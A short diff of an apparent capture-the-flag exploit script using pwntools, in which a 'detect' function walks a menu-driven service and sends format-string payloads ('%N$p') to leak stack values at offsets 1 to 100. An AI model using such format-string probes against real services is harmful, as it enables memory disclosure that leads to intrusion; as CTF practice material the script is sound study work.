@@ -4,9 +4,12 @@ from pwn import *
 
 def detect(io):
 	for i in range(100):
-		io.sendlineafter('2. Space food', '1')
-		io.sendlineafter('3. Deathstar(70.00 s.rocks)', '2')
-		io.sendlineafter('Red or Green Kryptonite?', '%'+str(i+1)+'$p')
+		io.recvuntil('2. Space food')
+		io.sendline( '1')
+		io.recvuntil('3. Deathstar(70.00 s.rocks)')
+		io.sendline('2')
+		io.recvuntil('Red or Green Kryptonite?')
+		io.sendline('%'+str(i+1)+'$p')
 		buf = io.recvline().strip()
 		print str(i+1)+' : '+buf
 
